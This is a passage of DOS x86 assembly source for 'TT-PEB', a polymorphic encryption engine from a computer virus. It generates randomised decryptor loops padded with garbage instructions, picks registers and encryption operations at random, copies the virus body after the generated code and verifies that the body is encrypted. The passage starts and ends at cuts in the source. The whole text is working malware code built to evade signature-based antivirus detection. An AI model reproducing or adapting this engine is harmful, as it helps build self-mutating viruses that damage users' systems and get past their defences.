                and     al,2                    ; two ways to do it
		cmp	al,0
                je      loc_66

                mov     ax,509ch                ; 'pushf' 'push ax'
                stosw
                mov     ax,9d58h                ; 'pop ax' 'popf' for later
		jmp	short loc_67
loc_66:
                mov     ax,9c50h                ; 'push ax' 'pushf'
                stosw
                mov     ax,589dh                ; 'popf' 'pop ax'
loc_67:
                push    ax                      ; will store at the end of
                                                ; the decryptor
no_saveaxf:
                mov     ax,[tt_saved_ax]
                and     ax,4                    ; more or less garbage
		cmp	ax,0
                je      not_toogarby
                call    garb_cntr
                call    garb_cntr               ; garbageeeeee :)
                call    garb_cntr
                call    garb_cntr
not_toogarby:
                call    regs_set                ; set one reg (cnt/pnt/op)
                call    garb_cntr
                call    garb_cntr
                call    regs_set                ; set another reg
                call    garb_cntr
                call    garb_cntr
                call    regs_set                ; set remaining reg
                call    garb_cntr
                call    garb_cntr
                mov     [dec_loop_start],di     ; save offset where will
                mov     byte ptr [decr_init],0  ; decryptor jump to
                call    garb_cntr
                call    garb_cntr
                call    math_oper               ; math oper on mem
                call    garb_cntr
                call    garb_cntr
                call    incdec_pntcnt           ; pnt/cnt update
                call    garb_cntr
                call    garb_cntr
                call    incdec_pntcnt           ; remaining pnt/cnt update
                call    garb_cntr
                call    garb_cntr
                call    check_counter           ; check on counter creation
                call    make_cond_jump          ; conditional jump for end
                call    jump_back               ; long jump back to start of
                                                ; decryptor
                mov     byte ptr [decr_init],0ffh
                mov     byte ptr [pntr_reg],0ffh        ; reset reg uses
                mov     byte ptr [cntr_reg],0ffh
                mov     byte ptr [oper_reg],0ffh

                mov     ax,[tt_saved_ax]
		and	ax,4
		cmp	ax,0
                je      not_toogarby2
                call    garb_cntr
                call    garb_cntr
not_toogarby2:
                mov     ax,[tt_saved_ax]
                and     ax,8                    ; need to preserve AX and F?
		cmp	ax,0
                je      loc_71
                pop     ax                      ; get the pops from stack
                stosw                           ; and store them
loc_71:
                mov     al,0cbh                 ; store the retf
                stosb
                mov     [encr_pnt],di           ; save its position

                push    es
		mov	ax,es
		sub	ax,40h
		mov	es,ax
		sub	di,di
                mov     cx,400h                 ; clear generation tables
		mov	al,0
                rep     stosb
		pop	es

                mov     si,[pntr_pos]
                mov     ax,[encr_pnt]           ; set pointer assignment
                mov     es:[si+1],ax            ; in decryptor (the memory
                                                ; one! the definitive that
                                                ; will be run will be put
                                                ; later
                push    ds
                lds     si,dword ptr [tt_saved_dx]
                mov     di,ds:[encr_pnt]
                mov     cx,cs:[tt_saved_cx]
                rep     movsb           ; copy virus body after generated
                                        ; code
                pop     ds

                mov     ax,es
		mov	ds,ax

                mov     ax,offset return_ply
                push    cs              ; push return adress on the stack
		push	ax

                sub     ax,ax
		push	es
		push	ax
                retf                    ; jump on encryptor

return_ply:                             ; returning point after the encryptor
                                        ; (hehe, decryptor :) ) has been
                                        ; executed
                sti
                cld
		mov	ax,cs
		mov	ds,ax
                mov     si,[mate_pos]
                mov     al,[math_oc]
                mov     es:[si],al      ; set the inverse math operation in
                                        ; the decryptor
                mov     di,[encr_pnt]
                mov     byte ptr es:[di-1],90h  ; put a NOP where the RET
                                                ; was
                mov     si,[pntr_pos]
                mov     ax,[encr_pnt]
                add     ax,[tt_saved_bp]
                add     ax,[tt_saved_si]        ; put starting value for
                mov     es:[si+1],ax            ; memory pointer register
                                                ; in the decryptor
                push    ds
                lds     si,dword ptr cs:[tt_saved_dx]
                mov     di,cs:[encr_pnt]
		mov	cx,10h
		add	si,cx
		add	di,cx
                repe    cmpsb                   ; check that body is encrypted
		pop	ds
                jnz     body_encrypted

                mov     ax,es
                sub     ax,40h                  ; if not start again
		mov	es,ax
                jmp     poly_init
body_encrypted:
		sub	dx,dx
		mov	ax,es
		mov	ds,ax
		sub	ax,40h
		mov	es,ax
                mov     cx,cs:[encr_pnt]        ; set return values
                add     cx,cs:[tt_saved_cx]
                mov     di,cs:[encr_pnt]
                mov     ax,cs:[tt_saved_cx]
		pop	bp
		pop	si
		pop	bx

                cli                             ; restore original SS:SP
                mov     sp,word ptr cs:[tt_saved_sp]
                mov     ss,word ptr cs:[tt_saved_ss]
                sti

                retn                            ; TT-PEB ending point

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

regs_set:
;
; regs_set creates the inital assignments to the counter (tbl1_b),
; pointer (tbl1_a) and math operation register (tbl1_c). of course it
; first check it hasn't been done yet.
;
                mov     ax,3
                mov     bx,offset table_1
                call    tbl2addr
                jmp     ax

table_1:
                dw      offset tbl1_a
                dw      offset tbl1_b
                dw      offset tbl1_c

tbl1_a:
                cmp     byte ptr [pntr_reg],0FFh
                jne     regs_set
                jmp     short pntr_crea
tbl1_b:
                cmp     byte ptr [cntr_reg],0FFh
                jne     regs_set
                jmp     short cntr_crea
tbl1_c:
                cmp     byte ptr [oper_reg],0FFh
                jne     regs_set
		jmp	loc_81


incdec_pntcnt:
;
; this routine:
;  1) decrements the counter reg (tbl2_b)
;  2) increments the pointer reg (tbl2_a)
; of course it first checks that it hasn't been yet done
;
                mov     ax,2
                mov     bx,offset table_2
                call    tbl2addr
		jmp	ax			;*Register jump
table_2:
                dw      offset tbl2_a
                dw      offset tbl2_b

tbl2_a:
                cmp     byte ptr [pntr_chdone],0ffh
                jnz     incdec_pntcnt
                jmp     pntr_update
tbl2_b:
                cmp     byte ptr [cntr_chdone],0ffh
                jne     incdec_pntcnt
                jmp     cntr_update

; pntr_crea creates the MOV pointer,offset_on_encr_code (offset is set near
; the end of the poly generation)
pntr_crea:
                mov     [pntr_pos],di
pntr_select:
		mov	ax,3
                mov     bx,offset table_3       ; which reg to use as pntr
                call    tbl2addr

                cmp     byte ptr [cntr_reg],al
                je      pntr_select
                mov     ah,byte ptr [oper_reg]  ; be sure it isn't already
                and     ah,0fbh                 ; used
		cmp	al,ah
                je      pntr_select

                mov     [pntr_reg],al
                or      al,0b8h                 ; mov opcode
                stosb
                add     di,2                    ; space for later assignment
		retn
table_3:
                dw      03h                     ; bx
                dw      06h                     ; si
                dw      07h                     ; di

cntr_crea:
;
; cntr_crea creates the inital assignment to the counter register.
; there are three ways to do so in tt-peb:
;  1) tbl4_a    directly sets value via 16bit mov (mov cntr16,value)
;  2) tbl4_b    first assigns the value to the low 8bits of the counter reg
;               and then to the high 8bits
;  3) tbl4_c    first assigns the value to the high 8bits, then to the low 8
; between the low 8 and high 8 bit set there will be some garbage.
; of course the tbl4_b and tbl4_c can't be used by 16bits only regs (bp,di,si)
;
;
                call    garb_rr1f               ; get a rnd register
                cmp     al,[pntr_reg]           ; not same as pointer
                je      cntr_crea

                mov     byte ptr [cntr_reg],al
		mov	dl,al
                cmp     dl,5                    ; bp 16only
                je      tbl4_a
                cmp     dl,6                    ; si 16only
                je      tbl4_a
                cmp     dl,7                    ; di 16only
                je      tbl4_a

                mov     ax,3
                mov     bx,offset table_4       ; for others randomly
                call    tbl2addr                ; select the method
                jmp     ax
table_4:
                dw      offset tbl4_a
                dw      offset tbl4_b
                dw      offset tbl4_c

tbl4_a:
                mov     al,dl
                or      al,0b8h
                stosb
                call    get_random
                mov     ah,00h
                mov     cx,ax
                mov     ax,virus_length
                cmp     byte ptr [poly_in_mem],0
                je      loca_1
                add     ax,cx
loca_1:
                stosw
                retn
tbl4_b:
                mov     al,dl
                or      al,0b0h
                stosb
                call    get_random
                mov     ah,00h
                mov     cx,ax
                mov     ax,virus_length
                cmp     byte ptr [poly_in_mem],0
                je      loc_79
                add     ax,cx
loc_79:
                stosb
		push	ax
		push	dx
		mov	al,7
                call    garbager
		pop	dx
		mov	al,dl
		or	al,0B4h
                stosb
		pop	ax
		mov	al,ah
                stosb
		retn
tbl4_c:
                mov     al,dl
		or	al,0B4h
                stosb
                call    get_random
		mov	ah,0
		mov	cx,ax
                mov     ax,virus_length
                cmp     byte ptr [poly_in_mem],0
                je      loc_80
		add	ax,cx
loc_80:
		xchg	al,ah
                stosb
		push	ax
		push	dx
		mov	al,7
                call    garbager
		pop	dx
		mov	al,dl
		or	al,0B0h
                stosb
		pop	ax
		mov	al,ah
                stosb
		retn
loc_81:
                call    garb_rr14
                mov     byte ptr [oper_reg],al
		or	al,0B0h
                stosb
                call    store_rnd_no0
		retn

math_oper:
;
; math_oper creates the code that encrypts/decrypts data in memory
;
                mov     [mathpos],di
                mov     ax,[tt_saved_ax]
                and     ax,1                    ; need to force CS: ?
		cmp	ax,0
                je      loc_82
                mov     al,2Eh                  ; force CS:
                stosb
		jmp	short loc_83
loc_82:
                call    garb_rr30
loc_83:
		mov	ax,3
                mov     bx,offset table_5       ; select enc/dec type
                call    tbl2addr

                mov     dx,ax
                mov     [math_oc],dh            ; store the inverse
                cmp     byte ptr [pntr_reg],3
                jne     loc_84
		mov	dh,7
loc_84:
                cmp     byte ptr [pntr_reg],6
                jne     loc_85
		mov	dh,4
loc_85:
                cmp     byte ptr [pntr_reg],7
                jne     loc_85a
		mov	dh,5
loc_85a:
		mov	ax,2
                mov     bx,offset table_6
                call    tbl2addr
                jmp     ax
table_6:
;
; the generated math operation should be:
;  1) tbl6_a:   math operation using the value from the operation reg
;  2) tbl6_b:   math operation using an immediate
;
                dw      offset tbl6_a
                dw      offset tbl6_b
tbl6_a:
                mov     [mate_pos],di
                mov     al,dl
                stosb
                mov     al,byte ptr [oper_reg]
                shl     al,3
                or      al,dh
                stosb
                retn
tbl6_b:
                mov     byte ptr [oper_reg],0ffh        ; can use the oper_reg
                or      [math_oc],dh
                mov     al,80h
                stosb
                mov     [mate_pos],di
                mov     al,dh
                or      al,dl
                stosb
                call    garb_rr07
                retn

table_5:        ;      ENC,DEC
                db     30h,30h          ; xor/xor
                db     28h,00h          ; add/sub
                db     00h,28h          ; sub/add

pntr_update:
;
; pntr_update creates the code to update the pointer on encrypted code
; there are 5 ways in which the poly does this:
;  1) tbl7_a:   inc pnt_reg
;  2) tbl7_b:   add pnt_reg,1   (adding 1 as a byte)
;  3) tbl7_c:   add pnt_reg,1   (adding 1 as a word)
;  4) tbl7_d:   sub pnt_reg,-1  (subbing -1 as a byte)
;  5) tbl7_e:   sub pnt_reg,-1  (subbing -1 as a word)
;
                mov     byte ptr [pntr_chdone],0
		mov	ax,5
                mov     bx,offset table_7
                call    tbl2addr
                jmp     ax
table_7:
                dw      offset tbl7_a
                dw      offset tbl7_b
                dw      offset tbl7_c
                dw      offset tbl7_d
                dw      offset tbl7_e

tbl7_a:
                mov     al,[pntr_reg]
                or      al,40h
                stosb
                retn
tbl7_b:
                mov     al,83h
                stosb
                mov     al,byte ptr [pntr_reg]
                or      al,0c0h
                stosb
                mov     al,01h
                stosb
                retn
tbl7_c:
                mov     al,81h
                stosb
                mov     al,byte ptr [pntr_reg]
                or      al,0c0h
                stosb
                mov     ax,01h
                stosw
                retn
tbl7_d:
                mov     al,83h
                stosb
                mov     al,byte ptr [pntr_reg]
                or      al,0e8h
                stosb
                mov     al,0ffh
                stosb
                retn
tbl7_e:
                mov     al,81h
                stosb
                mov     al,byte ptr [pntr_reg]
                or      al,0e8h
                stosb
                mov     ax,0ffffh
                stosw
                retn

cntr_update:
;
; cntr_update creates the code to update the counter in the decryption loop
; there are 5 ways to do so in ttpeb:
;  1) tbl8_a:   dec cnt_reg
;  2) tbl8_b:   sub cnt_reg,1   (subbing 1 as a byte)
;  3) tbl8_c:   sub cnt_reg,1   (subbing 1 as a word)
;  4) tbl8_d:   add cnt_reg,-1  (adding -1 as a byte)
;  5) tbl8_e:   add cnt_reg,-1  (adding -1 as a word)
;
                mov     byte ptr [cntr_chdone],0
		mov	ax,5
                mov     bx,offset table_8
                call    tbl2addr
                jmp     ax
table_8:
                dw      offset tbl8_a
                dw      offset tbl8_b
                dw      offset tbl8_c
                dw      offset tbl8_d
                dw      offset tbl8_e

tbl8_a:
                mov     al,byte ptr [cntr_reg]
                or      al,48h
                stosb
		retn

tbl8_b:
		mov	al,83h
                stosb
                mov     al,byte ptr [cntr_reg]
		or	al,0E8h
                stosb
		mov	al,1
                stosb
		retn
tbl8_c:
                mov     al,81h
                stosb
                mov     al,byte ptr [cntr_reg]
		or	al,0E8h
                stosb
		mov	ax,1
                stosw
		retn
tbl8_d:
                mov     al,83h
                stosb
                mov     al,byte ptr [cntr_reg]
		or	al,0C0h
                stosb
		mov	al,0FFh
                stosb
		retn
tbl8_e:
                mov     al,81h
                stosb
                mov     al,byte ptr [cntr_reg]
		or	al,0C0h
                stosb
		mov	ax,0FFFFh
                stosw
		retn

check_counter:
;
; check_counter creates the code to check if the counter is 0 so the loop
; has to finish
; there are 3 ways to do this:
;  1) tbl9_a:   cmp cnt_reg,0   (using 0 as a byte)
;  2) tbl9_b:   cmp cnt_reg,0   (using 0 as a word)
;  3) tbl9_c:   or  cnt_reg,cnt_reg

                mov     ax,3
                mov     bx,offset table_9
                call    tbl2addr
                jmp     ax

table_9:
                dw      offset tbl9_a
                dw      offset tbl9_b
                dw      offset tbl9_c

tbl9_a:
                mov     al,83h
                stosb
                mov     al,byte ptr [cntr_reg]
                or      al,0f8h
                stosb
                mov     al,00h
                stosb
                retn
tbl9_b:
                mov     al,81h
                stosb
                mov     al,byte ptr [cntr_reg]
                or      al,0f8h
                stosb
                mov     ax,00h
                stosw
                retn
tbl9_c:
                mov     al,09h
                stosb
                mov     al,byte ptr [cntr_reg]
                shl     al,3
                or      al,byte ptr [cntr_reg]
                or      al,0c0h
                stosb
                retn

make_cond_jump:
;
; make_cond_jump creates the conditional jump after the comparation of the
; counter register. the conditional jump will jump a few garbage instructions
; (generated in this routine) and the main jump to the start of the decryption
; loop (generated later in the jump_back routine).
;
                mov     al,74h                  ; jump zero
                stosb
		add	di,1
		push	di

                mov     byte ptr [spec_cnst],0
		mov	al,7
                call    garbager
                mov     byte ptr [spec_cnst],0FFh

                pop     bx
		mov	ax,di
		sub	ax,bx
                add     ax,3                    ; 3 bytes for the jump_back
                mov     es:[bx-1],al            ; set the offset to jump
		retn


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

; Creates the JMP back to the start of the decryption loop
jump_back:
		mov	bx,di
                mov     al,0e9h                 ; jmp opcode
                stosb
                mov     ax,[dec_loop_start]
		sub	bx,ax
		mov	ax,bx
		add	ax,3
		neg	ax
                stosw                           ; back offset
		retn


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

; Get the number of random instructions to generate depending on given
; option to TT-PEB in AX
garb_cntr:
                mov     ax,word ptr [tt_saved_ax]
		and	ax,2
		cmp	ax,0
                je      gb_exit1

                mov     al,3fh
                jmp     short garbager
gb_exit1:
                retn

; Create some garbage instructions. Needs AL as a mask to limit max rnd
; instruction number
garbager:
		mov	cl,al
                call    get_random
		and	al,cl
		mov	ah,0
		mov	cx,ax
                jmp     short garb_loop1

sub_37:
		mov	cl,al
                call    random_no0
		and	al,cl
		mov	ah,0
		mov	cx,ax
                jmp     short garb_loop1

; CX = number of garbage instructions to create
garb_loop1:
		cmp	cx,0
                je      garb_loop1_end

                push    cx
		call	sub_38
		pop	cx

                sub     cx,1
                jmp     short garb_loop1
garb_loop1_end:
		retn

sub_38:
		push	ds
		mov	ax,es
		sub	ax,40h
		mov	ds,ax
                mov     ax,ds:[0]
		mov	bx,2
                call    tbl2addr
		pop	ds

                cmp     ax,8000h        ; if >=8000h then a special
                                        ; construct has been choosen
                jae     loc_92

                mov     si,ax
                call    garb_compiler
		retn
loc_92:
                cmp     byte ptr [spec_cnst],0  ; creation possible? 0=NO
                je      loc_ret_93

                sub     ax,8000h                ; correct adress
                call    ax

loc_ret_93:
		retn

garb_compiler:
                cmp     byte ptr [si],0ffh      ; end of garbage line?
                je      loc_ret_97

                mov     ah,[si]                 ; get "command" to do
		add	si,1
		push	si
                mov     si,offset garb_routines
loc_95:
		cmp	[si],ah
                je      loc_96                  ; search the appropriate
                add     si,3                    ; command
		jmp	short loc_95
loc_96:
                mov     bx,[si+1]               ; adress in BX
		pop	si
                call    bx                      ; build garbage
                jmp     short garb_compiler

loc_ret_97:
		retn

tbl2addr:
; given as input the adress of a table (in DS:BX) and the number of elements
; in the table (in AX) this routine will return (in AX) the value of a random
; element of the table. this is expecially used to get the adress of a garbage
; or instruction generation routine from the engine tables

                push    bx
		push	cx
		push	dx
		mov	cx,ax
                call    random_in_ax            ; rnd in ax
loc_98:
                cmp     ax,cx
                jb      loc_99
                sub     ax,cx                   ; sub until a good (< than max)
                jmp     short loc_98            ; nr is choosen
loc_99:
                add     ax,ax                   ; each addr is 1 word long
                add     bx,ax                   ; + base of table
                mov     ax,[bx]                 ; get the value
		pop	dx
		pop	cx
		pop	bx
		retn

; Table with reference to garbage creation routines
garb_routines:
                db      00h
                dw      offset garb_rr00

                db      01h
                dw      offset garb_rr01

                db      02h
                dw      offset garb_rr02

                db      03h
                dw      offset garb_rr03

                db      04h
                dw      offset garb_rr04

                db      05h
                dw      offset garb_rr05

                db      06h
                dw      offset garb_rr06

                db      07h
                dw      offset garb_rr07

                db      08h
                dw      offset garb_rr08

                db      09h
                dw      offset garb_rr09

                db      0ah
                dw      offset garb_rr0a

                db      0bh
                dw      offset garb_rr0b

                db      0ch
                dw      offset garb_rr0c

                db      0dh
                dw      offset garb_rr0d

                db      0eh
                dw      offset garb_rr0e

                db      0fh
                dw      offset garb_rr0f

                db      10h
                dw      offset garb_rr10

                db      11h
                dw      offset garb_rr11

                db      12h
                dw      offset garb_rr12

                db      13h
                dw      offset garb_rr13

                db      14h
                dw      offset garb_rr14

                db      15h
                dw      offset garb_rr15

                db      16h
                dw      offset garb_rr16

                db      17h
                dw      offset garb_rr17

                db      18h
                dw      offset garb_rr18

                db      19h
                dw      offset garb_rr19

                db      1ah
                dw      offset garb_rr1a

                db      1bh
                dw      offset garb_rr1b

                db      1ch
                dw      offset garb_rr1c

                db      1dh
                dw      offset garb_rr1d

                db      1eh
                dw      offset garb_rr1e

                db      1fh
                dw      offset garb_rr1f

                db      20h
                dw      offset garb_rr20

                db      21h
                dw      offset garb_rr21

                db      22h
                dw      offset garb_rr22

                db      23h
                dw      offset garb_rr23

                db      24h
                dw      offset garb_rr24

                db      25h
                dw      offset garb_rr25

                db      26h
                dw      offset garb_rr26

                db      27h
                dw      offset garb_rr27

                db      28h
                dw      offset garb_rr28

                db      29h
                dw      offset garb_rr29

                db      2ah
                dw      offset garb_rr2a

                db      2bh
                dw      offset garb_rr2b

                db      2ch
                dw      offset garb_rr2c

                db      2dh
                dw      offset garb_rr2d

                db      2eh
                dw      offset garb_rr2e

                db      2fh
                dw      offset garb_rr2f

                db      30h
                dw      offset garb_rr30

                db      31h
                dw      offset garb_rr31

                db      32h
                dw      offset garb_rr32

garb_rr00:
                movsb
                retn

garb_rr01:
                push    cx
                mov     ch,0
		mov	cl,[si]
		add	si,1
                rep     movsb
		pop	cx
		retn

garb_rr02:
                lodsb                           ; String [si] to al
		retn

garb_rr03:
                stosb                           ; Store al to es:[di]
		retn

garb_rr04:
get_random:                ; output random byte in AL

                mov     byte ptr cs:[tmp_store_ah],ah

;                cmp     word ptr cs:[rnd_pos],0FFh       ; first random?
                db       2Eh,83h,3Eh,64h,0Dh,0FFh
                jnz     first_random

                in      al,40h                  ; port 40h, 8253 timer 0 clock
		mov	ah,al
		mov	al,0
                mov     word ptr cs:[rnd_pos],ax
first_random:
                push    si
		push	ds
		mov	ax,0F000h
		mov	ds,ax
                mov     si,word ptr cs:[rnd_pos]
look_randy:
                mov     al,byte ptr [si]

                cmp     al,byte ptr [si+1]
                jne     ok_randy

                cmp     al,byte ptr [si+2]
                jne     ok_randy

                cmp     al,byte ptr [si+3]
                jne     ok_randy

                add     si,1
                jmp     short look_randy
ok_randy:
		add	si,1
                mov     word ptr cs:[rnd_pos],si
		pop	ds
		pop	si
                mov     ah,byte ptr cs:[tmp_store_ah]
		retn

rnd_pos         dw      98e3h

garb_rr05:
                call    get_random
		stosb				; Store al to es:[di]
		retn

garb_rr06:
random_no0:
                call    get_random
		cmp	al,0
                je      random_no0
		retn

garb_rr07:
store_rnd_no0:
                call    random_no0
		stosb				; Store al to es:[di]
		retn

garb_rr08:
random_noff:
                call    get_random
		cmp	al,0FFh
                je      random_noff
		retn

garb_rr09:
                call    random_noff
		stosb				; Store al to es:[di]
		retn

random_in_ax:
                call    get_random
		mov	ah,al
                call    get_random
		retn

garb_rr0a:
		and	al,[si]
		add	si,1
		stosb				; Store al to es:[di]
		retn

garb_rr0b:
                or      al,[si]
		add	si,1
		stosb				; Store al to es:[di]
		retn

garb_rr0c:
                and     al,[si]
		add	si,1
		or	al,[si]
		add	si,1
		stosb				; Store al to es:[di]
		retn

garb_rr0d:
                mov     cl,[si]
		add	si,1
                shr     al,cl
		retn

garb_rr0e:
		mov	cl,[si]
		add	si,1
                shl     al,cl
		retn

garb_rr0f:
                cmp     byte ptr [some_lock],0
		jne	loc_106			; Jump if not equal
                mov     byte ptr [some_lock],0FFh
                call    garb_rr19
                mov     byte ptr [some_lock],0
		retn
loc_106:
                call    get_random
		and	al,7
		retn

sub_47:
                call    garb_rr0f
		mov	ah,al
                shl     ah,3
		retn

garb_rr10:
		call	sub_47
                call    garb_rr0f
		or	al,ah
		retn

garb_rr11:
                call    sub_49
                call    garb_rr0f
		or	al,ah
		retn

garb_rr12:
                call    sub_51
                call    garb_rr0f
		or	al,ah
		retn

garb_rr13:
		call	sub_47
                call    garb_rr1e
		or	al,ah
		retn

garb_rr14:
                cmp     byte ptr [some_lock],0
		jne	loc_107			; Jump if not equal
                mov     byte ptr [some_lock],0FFh
                call    garb_rr19
                mov     byte ptr [some_lock],0
		retn
loc_107:
                mov     byte ptr ds:[tmp_store_ah],ah
loc_108:
                mov     ah,byte ptr ds:[tmp_store_ah]
                call    garb_rr0f
                mov     byte ptr ds:[tmp_store_ah],ah
		mov	ah,al
		and	ah,3
                cmp     [pntr_reg],ah
		je	loc_108			; Jump if equal
                cmp     byte ptr [cntr_reg],ah
		je	loc_108			; Jump if equal
                mov     ah,byte ptr ds:[tmp_store_ah]
		retn


sub_49:
                call    garb_rr14
		mov	ah,al
                shl     ah,3
		retn

garb_rr15:
		call	sub_47
                call    garb_rr14
		or	al,ah
		retn

garb_rr16:
                call    sub_49
                call    garb_rr14
		or	al,ah
		retn

garb_rr17:
                call    sub_51
                call    garb_rr14
		or	al,ah
		retn

garb_rr18:
                call    sub_49
                call    garb_rr1e
		or	al,ah
		retn

garb_rr19:
                call    garb_rr14
                cmp     byte ptr [oper_reg],al
                je      garb_rr19
		retn

sub_51:
                call    garb_rr19
		mov	ah,al
                shl     ah,3
		retn

garb_rr1a:
		call	sub_47
                call    garb_rr19
		or	al,ah
		retn

garb_rr1b:
                call    sub_49
                call    garb_rr19
		or	al,ah
		retn

garb_rr1c:
		call	sub_51
                call    garb_rr19
		or	al,ah
		retn

garb_rr1d:
		call	sub_51
                call    garb_rr1e
		or	al,ah
		retn

garb_rr1e:
                call    get_random
		and	al,7
		cmp	al,6
                je      garb_rr1e
		retn

garb_rr1f:
                cmp     byte ptr [some_lock],0
		jne	loc_112			; Jump if not equal
                mov     byte ptr [some_lock],0FFh
                call    garb_rr29
                mov     byte ptr [some_lock],0
		retn
loc_112:
                call    get_random
		and	al,7
		cmp	al,4
                je      garb_rr1f
		retn

sub_54:
                call    garb_rr1f
		mov	ah,al
                shl     ah,3                    ; Shift w/zeros fill
		retn

garb_rr20:
		call	sub_54
                call    garb_rr1f
		or	al,ah
		retn

garb_rr21:
                call    sub_56
                call    garb_rr1f
		or	al,ah
		retn

garb_rr22:
                call    sub_58
                call    garb_rr1f
		or	al,ah
		retn

garb_rr23:
		call	sub_54
                call    garb_rr1e
		or	al,ah
		retn

garb_rr24:
                cmp     byte ptr [some_lock],0
		jne	loc_114			; Jump if not equal
                mov     byte ptr [some_lock],0FFh
                call    garb_rr29
                mov     byte ptr [some_lock],0
		retn
loc_114:
                call    garb_rr1f
                cmp     [pntr_reg],al
                je      garb_rr24
                cmp     byte ptr [cntr_reg],al
                je      garb_rr24
		retn


sub_56:
                call    garb_rr24
		mov	ah,al
                shl     ah,3
		retn

garb_rr25:
		call	sub_54
                call    garb_rr24
		or	al,ah
		retn

garb_rr26:
                call    sub_56
                call    garb_rr24
		or	al,ah
		retn

garb_rr27:
		call	sub_58
                call    garb_rr24
		or	al,ah
		retn

garb_rr28:
		call	sub_56
                call    garb_rr1e
		or	al,ah
		retn

garb_rr29:
                mov     byte ptr ds:[tmp_store_ah],ah
loc_115:
                mov     ah,byte ptr ds:[tmp_store_ah]
                call    garb_rr24
                mov     byte ptr ds:[tmp_store_ah],ah
                mov     ah,byte ptr [oper_reg]
		and	ah,0FBh
		cmp	al,ah
		je	loc_115			; Jump if equal
                mov     ah,byte ptr ds:[tmp_store_ah]
		retn

sub_58:
                call    garb_rr29
		mov	ah,al
                shl     ah,3                    ; Shift w/zeros fill
		retn

garb_rr2a:
		call	sub_54
                call    garb_rr29
		or	al,ah
		retn

garb_rr2b:
		call	sub_56
                call    garb_rr29
		or	al,ah
		retn

garb_rr2c:
		call	sub_58
                call    garb_rr29
		or	al,ah
		retn

garb_rr2d:
		call	sub_58
                call    garb_rr1e
		or	al,ah
		retn

garb_rr2e:
		mov	al,[si]
		add	si,1
		mov	ah,al
		and	ah,3
                cmp     [pntr_reg],ah
                je      loc_ret_116
                cmp     byte ptr [cntr_reg],ah
                je      loc_ret_116
                cmp     byte ptr [oper_reg],al
                je      loc_ret_116
		add	si,1

loc_ret_116:
		retn

garb_rr2f:
                mov     al,[si]
		add	si,1
                cmp     [pntr_reg],al
                je      loc_ret_117
                cmp     byte ptr [cntr_reg],al
                je      loc_ret_117
                mov     ah,byte ptr [oper_reg]
		and	ah,0FBh
		cmp	al,ah
                je      loc_ret_117
		add	si,1
loc_ret_117:
		retn

garb_rr30:
                call    get_random
		and	al,3
		cmp	al,0
		jne	loc_ret_119		; Jump if not equal
                call    get_random
		and	al,18h
		cmp	al,10h
                je      garb_rr30
                or      al,26h
                stosb
loc_ret_119:
		retn

garb_rr31:
                cmp     byte ptr [decr_init],0
                je      loc_ret_120
                cmp     byte ptr [cntr_reg],1
                je      loc_ret_120
                cmp     byte ptr [oper_reg],1
                je      loc_ret_120
                cmp     byte ptr [oper_reg],5
                je      loc_ret_120
                mov     al,byte ptr [oper_reg]
		and	al,0FBh
		cmp	al,1
                je      loc_ret_120
                call    get_random
		and	al,3
		cmp	al,0
                jne     loc_ret_120
                call    get_random
		and	al,1
		or	al,0F2h
                stosb
loc_ret_120:
		retn

garb_rr32:
                cmp     byte ptr [decr_init],0
                je      loc_ret_121
		add	si,1
loc_ret_121:
		retn

tmp_store_ah    db      29h                     ; tmp space to store AH


                db      00h
                db      00h
; this table contains the offsets to the garbage constructs.
; the first few (that create more complicated constructs like calls) have
; a fixed added value of 8000h, so the main generation routine will see if
; one of them has been choosen. this is done to make the detection of such
; constructs faster. infact this kind of constructs can't be always done
; (the poly doesn't generate a call construct in another call construct and
; such like things) of course the offsets will be corrected later.
garbage_offsets:
                dw      offset garb_cf0 + 8000h
                dw      offset garb_cf1 + 8000h
                dw      offset garb_cf2 + 8000h
                dw      offset garb_cf3 + 8000h
                dw      offset garb_cf4 + 8000h
                dw      offset garb_cf5 + 8000h
                dw      offset garb_c00
                dw      offset garb_c01
                dw      offset garb_c02
                dw      offset garb_c03
                dw      offset garb_c04
                dw      offset garb_c05
                dw      offset garb_c06
                dw      offset garb_c07
                dw      offset garb_c08
                dw      offset garb_c0a
                dw      offset garb_c0c
                dw      offset garb_c0d
                dw      offset garb_c0f
                dw      offset garb_c11
                dw      offset garb_c13
                dw      offset garb_c15
                dw      offset garb_c18
                dw      offset garb_c1c
                dw      offset garb_c1e
                dw      offset garb_c20
                dw      offset garb_c22
                dw      offset garb_c24
                dw      offset garb_c27
                dw      offset garb_c29
                dw      offset garb_c2a
                dw      offset garb_c2b
                dw      offset garb_c2c
                dw      offset garb_c2d
                dw      offset garb_c2e
                dw      offset garb_c2f
                dw      offset garb_c30
                dw      offset garb_c31
                dw      offset garb_c32
                dw      offset garb_c33
                dw      offset garb_c34
                dw      offset garb_c35
                dw      offset garb_c36
                dw      offset garb_c37
                dw      offset garb_c38
                dw      offset garb_c39
                dw      offset garb_c3a
                dw      offset garb_c3b
                dw      offset garb_c3c
                dw      offset garb_c3d
                dw      offset garb_c3e
                dw      offset garb_c3f
                dw      offset garb_c40
                dw      offset garb_c41
                dw      offset garb_c42
                dw      offset garb_c43
                dw      offset garb_c44
                dw      offset garb_c45
                dw      offset garb_c46
                dw      offset garb_c47
                dw      offset garb_c48
                dw      offset garb_c49
                dw      offset garb_c4a
                dw      offset garb_c4b
                dw      offset garb_c4c
                dw      offset garb_c4d
                dw      offset garb_c4e
                dw      offset garb_c4f
                dw      offset garb_c50
                dw      offset garb_c51
                dw      offset garb_c52
                dw      offset garb_c53
                dw      offset garb_c54
                dw      offset garb_c55
                dw      offset garb_c56
                dw      offset garb_c57
                dw      offset garb_c58
                dw      offset garb_c59
                dw      offset garb_c5a
                dw      offset garb_c5b
                dw      offset garb_c5c
                dw      offset garb_c5d
                dw      offset garb_c5e
                dw      offset garb_c5f
                dw      offset garb_c60
                dw      offset garb_c61
                dw      offset garb_c62
                dw      offset garb_c63
                dw      offset garb_c64
                dw      offset garb_c65
                dw      offset garb_c66
                dw      offset garb_c67
                dw      offset garb_c68
                dw      offset garb_c69
                dw      offset garb_c6a
                dw      offset garb_c6b
                dw      offset garb_c6c
                dw      offset garb_c6d
                dw      offset garb_c6e
                dw      offset garb_c6f
